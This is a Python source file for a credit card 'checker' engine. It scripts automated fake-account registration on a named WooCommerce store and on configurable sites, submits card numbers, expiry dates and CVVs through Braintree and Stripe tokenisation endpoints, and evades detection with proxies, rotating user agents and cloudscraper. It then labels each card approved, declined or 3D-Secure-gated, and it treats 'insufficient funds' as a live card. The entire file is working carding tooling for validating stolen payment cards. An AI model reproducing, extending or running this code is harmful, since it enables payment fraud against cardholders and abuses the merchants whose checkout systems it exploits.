import asyncio
import requests
import json
import re
import time
import random
import string
import base64
from database import DatabaseManager
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs

class GatewayEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db

    def format_request(self, template, card_data):
        replacements = {
            '{card}': card_data.get('number', ''),
            '{card_number}': card_data.get('number', ''),
            '{month}': card_data.get('month', ''),
            '{year}': card_data.get('year', ''),
            '{cvv}': card_data.get('cvv', ''),
            '{cvc}': card_data.get('cvv', ''),
            '{mm}': card_data.get('month', ''),
            '{yy}': card_data.get('year', ''),
        }
        result = template
        for key, val in replacements.items():
            result = result.replace(key, val)
        return result

    def analyze_response(self, raw_text, gw=None):
        result = {
            'category': 'unknown',
            'status_text': 'UNKNOWN',
            'reason': 'Unknown Response',
            'amount': None,
            'requires_3ds': False,
            'raw': raw_text[:2000]
        }

        if gw:
            success_pat = gw.get('success_pattern', '').strip()
            decline_pat = gw.get('decline_pattern', '').strip()
            error_pat = gw.get('error_pattern', '').strip()

            if success_pat and re.search(success_pat, raw_text, re.IGNORECASE):
                result.update({'category': 'approved_charged', 'status_text': 'APPROVED', 'reason': 'Success'})
                return result
            if decline_pat and re.search(decline_pat, raw_text, re.IGNORECASE):
                result.update({'category': 'declined', 'status_text': 'DECLINED', 'reason': 'Declined'})
                return result
            if error_pat and re.search(error_pat, raw_text, re.IGNORECASE):
                result.update({'category': 'error', 'status_text': 'ERROR', 'reason': 'Error'})
                return result

        try:
            data = json.loads(raw_text)
            if 'error' in data:
                err = data['error']
                code = err.get('decline_code', '')
                if code == 'insufficient_funds':
                    result.update({'category': 'approved_insufficient', 'status_text': 'APPROVED', 'reason': 'Insufficient Funds'})
                else:
                    result.update({'category': 'declined', 'status_text': 'DECLINED', 'reason': err.get('message', 'Declined')})
            elif data.get('status') == 'succeeded':
                amt = data.get('amount', 0)
                curr = data.get('currency', 'usd').upper()
                result.update({'category': 'approved_charged', 'status_text': 'APPROVED', 'reason': 'Payment Successful', 'amount': f"{amt/100:.2f} {curr}"})
            elif data.get('status') == 'requires_action':
                result.update({'category': 'auth_required', 'status_text': 'APPROVED', 'reason': '3D Secure / OTP Required', 'requires_3ds': True})
            elif data.get('status') == 'requires_capture':
                result.update({'category': 'approved_auth_only', 'status_text': 'APPROVED', 'reason': 'Authorized (Not Captured)'})
        except Exception:
            text_lower = raw_text.lower()
            if re.search(r'(approved|success|succeeded)', text_lower):
                if 'insufficient' in text_lower or 'funds' in text_lower:
                    result.update({'category': 'approved_insufficient', 'status_text': 'APPROVED', 'reason': 'Insufficient Funds'})
                else:
                    result.update({'category': 'approved_charged', 'status_text': 'APPROVED', 'reason': 'Success'})
            elif re.search(r'(declined|rejected|error|fail)', text_lower):
                result.update({'category': 'declined', 'status_text': 'DECLINED', 'reason': 'Declined'})

        return result

    async def check_braintree(self, card_data, proxy_data=None):
        """BRAINTREE AUTH Gateway Logic"""
        import cloudscraper
        from faker import Faker
        
        fake = Faker()
        session = cloudscraper.create_scraper()
        
        if proxy_data:
            proxy_str = proxy_data['proxy_string']
            if '://' not in proxy_str:
                proxy_str = f"{proxy_data['protocol']}://{proxy_str}"
            session.proxies = {"http": proxy_str, "https": proxy_str}
        
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        base_headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }

        email = fake.email()
        name = fake.name()
        card_number = card_data['number']
        exp_month = card_data['month']
        exp_year = card_data['year']
        cvv = card_data['cvv']

        start_time = time.time()

        try:
            # 1. Get registration nonce
            resp = session.get('https://www.dnalasering.com/my-account/', headers=base_headers, timeout=30)
            if resp.status_code != 200:
                return {'success': False, 'error': f'Failed to load page: {resp.status_code}', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', resp.text)
            register_nonce = nonce_match.group(1) if nonce_match else None
            if not register_nonce:
                return {'success': False, 'error': 'Could not find registration nonce', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            time.sleep(1)

            # 2. Register new user
            register_data = {
                'email': email,
                'woocommerce-register-nonce': register_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            register_headers = base_headers.copy()
            register_headers.update({
                'Origin': 'https://www.dnalasering.com',
                'Referer': 'https://www.dnalasering.com/my-account/',
                'Content-Type': 'application/x-www-form-urlencoded',
            })
            resp = session.post('https://www.dnalasering.com/my-account/', headers=register_headers, data=register_data, timeout=30)
            if resp.status_code not in (200, 302):
                return {'success': False, 'error': f'Registration failed: {resp.status_code}', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            time.sleep(1)

            # 3. Get add-payment-method page and nonces
            resp = session.get('https://www.dnalasering.com/my-account/add-payment-method/', headers=base_headers, timeout=30)
            if resp.status_code != 200:
                return {'success': False, 'error': f'Failed to load payment page: {resp.status_code}', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            wc_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', resp.text)
            wc_add_payment_nonce = wc_nonce_match.group(1) if wc_nonce_match else None
            if not wc_add_payment_nonce:
                return {'success': False, 'error': 'Could not find WooCommerce nonce', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            token_match = re.search(r'client_token_nonce":"([^"]+)"', resp.text)
            if not token_match:
                token_match = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)\\u0022', resp.text)
            client_token_nonce = token_match.group(1) if token_match else None
            if not client_token_nonce:
                return {'success': False, 'error': 'Could not find client_token_nonce', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}

            # 4. Get Braintree client token
            ajax_data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': client_token_nonce,
            }
            ajax_headers = {
                'User-Agent': user_agent,
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.dnalasering.com',
                'Referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
            }
            ajax_resp = session.post('https://www.dnalasering.com/wp-admin/admin-ajax.php', headers=ajax_headers, data=ajax_data, timeout=30)
            if ajax_resp.status_code != 200:
                return {'success': False, 'error': f'AJAX request failed: {ajax_resp.status_code}', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            try:
                ajax_json = ajax_resp.json()
                decoded = base64.b64decode(ajax_json['data']).decode('utf-8')
                token_data = json.loads(decoded)
                auth_fingerprint = token_data.get('authorizationFingerprint')
                if not auth_fingerprint:
                    return {'success': False, 'error': 'No authorizationFingerprint', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            except Exception as e:
                return {'success': False, 'error': f'Failed to decode token: {e}', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}

            # 5. Tokenize credit card
            json_graphql = {
                'clientSdkMetadata': {'source': 'client', 'integration': 'custom'},
                'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                    tokenizeCreditCard(input: $input) {
                        token
                        creditCard {
                            bin
                            brandCode
                            last4
                            cardholderName
                            expirationMonth
                            expirationYear
                        }
                    }
                }''',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': card_number,
                            'expirationMonth': exp_month,
                            'expirationYear': exp_year,
                            'cvv': cvv,
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            graphql_headers = {
                'authority': 'payments.braintree-api.com',
                'authorization': f'Bearer {auth_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': user_agent,
            }
            graphql_resp = session.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=json_graphql, timeout=30)
            graphql_json = graphql_resp.json()
            
            if 'errors' in graphql_json:
                return {'success': False, 'error': 'GraphQL tokenization failed', 'category': 'declined', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            payment_token = graphql_json.get('data', {}).get('tokenizeCreditCard', {}).get('token')
            if not payment_token:
                return {'success': False, 'error': 'Could not extract payment token', 'category': 'declined', 'elapsed': f'{round(time.time()-start_time, 2)}s'}

            # 6. Submit payment method
            post_data = [
                ('payment_method', 'braintree_credit_card'),
                ('wc-braintree-credit-card-card-type', 'visa'),
                ('wc_braintree_credit_card_payment_nonce', payment_token),
                ('wc_braintree_device_data', '{}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
                ('woocommerce-add-payment-method-nonce', wc_add_payment_nonce),
                ('_wp_http_referer', '/my-account/add-payment-method/'),
                ('woocommerce_add_payment_method', '1'),
            ]
            submit_headers = base_headers.copy()
            submit_headers.update({
                'Origin': 'https://www.dnalasering.com',
                'Referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
                'Content-Type': 'application/x-www-form-urlencoded',
            })
            submit_resp = session.post('https://www.dnalasering.com/my-account/add-payment-method/', headers=submit_headers, data=post_data, timeout=30)
            
            elapsed = round(time.time() - start_time, 2)
            response_text = submit_resp.text.lower()
            
            if "payment method successfully added" in response_text or "duplicate card exists" in response_text:
                return {
                    'success': True,
                    'category': 'approved_charged',
                    'status_text': 'APPROVED',
                    'reason': 'Payment method added successfully',
                    'elapsed': f'{elapsed}s',
                    'raw': submit_resp.text[:1500]
                }
            else:
                error_msg = "Unknown error"
                error_match = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', submit_resp.text, re.DOTALL)
                if error_match:
                    error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
                return {
                    'success': False,
                    'category': 'declined',
                    'status_text': 'DECLINED',
                    'reason': error_msg,
                    'elapsed': f'{elapsed}s',
                    'raw': submit_resp.text[:1500]
                }
        
        except Exception as e:
            return {
                'success': False,
                'category': 'error',
                'status_text': 'ERROR',
                'reason': str(e),
                'elapsed': f'{round(time.time()-start_time, 2)}s',
                'raw': ''
            }

    async def check_woocommerce_stripe(self, card_data, site_url, proxy_data=None, check_otp=False):
        """WooCommerce Stripe Gateway Logic (PASSED or OTP/3D)"""
        session = requests.Session()
        
        if proxy_data:
            proxy_str = proxy_data['proxy_string']
            if '://' not in proxy_str:
                proxy_str = f"{proxy_data['protocol']}://{proxy_str}"
            session.proxies = {"http": proxy_str, "https": proxy_str}
        
        USER_AGENTS = [
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        ]
        UA = random.choice(USER_AGENTS)
        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': UA,
        }
        
        email = ''.join(random.choices(string.ascii_lowercase, k=6)) + "@gmail.com"
        pas = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        start_time = time.time()
        
        try:
            # 1. Get registration nonce
            resp = session.get(f'{site_url}/my-account/', headers=headers, timeout=15)
            if resp.status_code != 200:
                return {'success': False, 'error': f'Site not accessible: {resp.status_code}', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            soup = BeautifulSoup(resp.text, 'html.parser')
            nonce_tag = soup.find("input", {"name": "woocommerce-register-nonce"})
            if not nonce_tag or 'value' not in nonce_tag.attrs:
                return {'success': False, 'error': 'Registration nonce not found', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            reg_nonce = nonce_tag['value']
            
            # 2. Register new user
            register_data = {
                'email': email,
                'password': pas,
                'woocommerce-register-nonce': reg_nonce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            register_headers = headers.copy()
            register_headers.update({
                'Origin': site_url,
                'Referer': f'{site_url}/my-account/',
                'Content-Type': 'application/x-www-form-urlencoded',
            })
            resp = session.post(f'{site_url}/my-account/', headers=register_headers, data=register_data, timeout=20)
            
            # 3. Get payment method page
            payment_headers = headers.copy()
            payment_headers.update({
                'Referer': f'{site_url}/my-account/payment-methods/',
            })
            resp = session.get(f'{site_url}/my-account/add-payment-method/', headers=payment_headers, timeout=15)
            html = resp.text
            
            # 4. Extract Stripe keys
            pks_m = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', html)
            acct_m = re.search(r'"accountId"\s*:\s*"([^"]+)"', html)
            nonce_m = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', html)
            
            if not pks_m or not acct_m or not nonce_m:
                return {'success': False, 'error': 'Stripe keys not found', 'category': 'error', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            pks = pks_m.group(1)
            acct = acct_m.group(1)
            nonce = nonce_m.group(1)
            
            # 5. Create payment method
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': UA,
            }
            stripe_data = f'billing_details[name]=+&billing_details[email]={email}&billing_details[address][country]=US&type=card&card[number]={card_data["number"]}&card[cvc]={card_data["cvv"]}&card[exp_year]={card_data["year"][-2:]}&card[exp_month]={card_data["month"]}&key={pks}&_stripe_account={acct}'
            
            resp = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=30)
            if resp.status_code != 200:
                return {'success': False, 'error': f'Stripe API error: {resp.status_code}', 'category': 'declined', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            stripe_json = resp.json()
            if 'id' not in stripe_json:
                return {'success': False, 'error': 'Payment method creation failed', 'category': 'declined', 'elapsed': f'{round(time.time()-start_time, 2)}s'}
            
            pm_id = stripe_json['id']
            
            # 6. Create setup intent
            ajax_data = {
                'action': 'create_setup_intent',
                'wcpay-payment-method': pm_id,
                '_ajax_nonce': nonce,
            }
            ajax_headers = {
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': site_url,
                'Referer': f'{site_url}/my-account/add-payment-method/',
                'User-Agent': UA,
                'X-Requested-With': 'XMLHttpRequest',
            }
            resp = session.post(f'{site_url}/wp-admin/admin-ajax.php', headers=ajax_headers, data=ajax_data, timeout=30)
            
            elapsed = round(time.time() - start_time, 2)
            result_json = resp.json()
            
            # Check for OTP/3DS
            status = result_json.get('data', {}).get('status', '')
            if status == 'requires_action' or 'requires_action' in str(result_json):
                if check_otp:
                    return {
                        'success': True,
                        'category': 'auth_required',
                        'status_text': 'OTP/3D',
                        'reason': '3D Secure / OTP Required',
                        'requires_3ds': True,
                        'elapsed': f'{elapsed}s',
                        'raw': json.dumps(result_json)[:1500]
                    }
                else:
                    return {
                        'success': False,
                        'category': 'declined',
                        'status_text': 'DECLINED',
                        'reason': 'OTP/3DS Required (not PASSED)',
                        'elapsed': f'{elapsed}s',
                        'raw': json.dumps(result_json)[:1500]
                    }
            elif status == 'succeeded' or 'succeeded' in str(result_json):
                if check_otp:
                    return {
                        'success': False,
                        'category': 'declined',
                        'status_text': 'DECLINED',
                        'reason': 'No OTP/3DS (not OTP card)',
                        'elapsed': f'{elapsed}s',
                        'raw': json.dumps(result_json)[:1500]
                    }
                else:
                    return {
                        'success': True,
                        'category': 'approved_charged',
                        'status_text': 'PASSED',
                        'reason': 'Payment method added successfully',
                        'elapsed': f'{elapsed}s',
                        'raw': json.dumps(result_json)[:1500]
                    }
            else:
                return {
                    'success': False,
                    'category': 'declined',
                    'status_text': 'DECLINED',
                    'reason': f'Unknown status: {status}',
                    'elapsed': f'{elapsed}s',
                    'raw': json.dumps(result_json)[:1500]
                }
        
        except Exception as e:
            return {
                'success': False,
                'category': 'error',
                'status_text': 'ERROR',
                'reason': str(e),
                'elapsed': f'{round(time.time()-start_time, 2)}s',
                'raw': ''
            }

    async def check_single(self, gateway_id, card_data, proxy_data=None):
        if isinstance(gateway_id, dict):
            gw = gateway_id
        else:
            gw = self.db.get_gateway_by_id(gateway_id)
        
        if not gw:
            return {'success': False, 'error': 'Gateway not found', 'category': 'error'}

        # Handle built-in gateways
        if gw.get('id') == -5:  # BRAINTREE AUTH
            return await self.check_braintree(card_data, proxy_data)
        elif gw.get('id') == -6:  # STRIPE WOOCOMMERCE PASSED
            from config import WOOCOMMERCE_SITE_PASSED
            return await self.check_woocommerce_stripe(card_data, WOOCOMMERCE_SITE_PASSED, proxy_data, check_otp=False)
        elif gw.get('id') == -7:  # STRIPE WOOCOMMERCE OTP/3D
            from config import WOOCOMMERCE_SITE_OTP
            return await self.check_woocommerce_stripe(card_data, WOOCOMMERCE_SITE_OTP, proxy_data, check_otp=True)

        # Handle database gateways
        proxy = None
        proxy_id = None
        if proxy_data:
            proxy_str = proxy_data['proxy_string']
            if '://' not in proxy_str:
                proxy_str = f"{proxy_data['protocol']}://{proxy_str}"
            proxy = {"http": proxy_str, "https": proxy_str}
            proxy_id = proxy_data['id']

        start = time.time()
        loop = asyncio.get_running_loop()

        try:
            method = gw['method'].upper()
            url = gw['api_endpoint']
            headers = json.loads(gw['headers_json']) if gw['headers_json'] else {}
            body = self.format_request(gw['body_template'], card_data)
            timeout = int(gw['timeout_seconds'] or 30)

            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

            if method == 'GET':
                resp = await loop.run_in_executor(None, lambda: requests.get(url, headers=headers, proxies=proxy, timeout=timeout))
            else:
                if 'json' in headers.get('Content-Type', '').lower():
                    try:
                        json_body = json.loads(body)
                        resp = await loop.run_in_executor(None, lambda: requests.post(url, json=json_body, headers=headers, proxies=proxy, timeout=timeout))
                    except Exception:
                        resp = await loop.run_in_executor(None, lambda: requests.post(url, data=body, headers=headers, proxies=proxy, timeout=timeout))
                else:
                    resp = await loop.run_in_executor(None, lambda: requests.post(url, data=body, headers=headers, proxies=proxy, timeout=timeout))

            elapsed = round(time.time() - start, 2)
            parsed = self.analyze_response(resp.text, gw)

            return {
                'success': True,
                'proxy_id': proxy_id,
                'category': parsed['category'],
                'status_text': parsed['status_text'],
                'reason': parsed['reason'],
                'amount': parsed['amount'],
                'requires_3ds': parsed['requires_3ds'],
                'elapsed': f"{elapsed}s",
                'http_code': resp.status_code,
                'raw': resp.text[:1500]
            }
        except Exception as e:
            if proxy_id:
                self.db.increment_proxy_fail(proxy_id)
            return {
                'success': False,
                'proxy_id': proxy_id,
                'error': str(e),
                'category': 'error',
                'reason': str(e),
                'elapsed': f"{round(time.time() - start, 2)}s",
                'raw': ''
            }
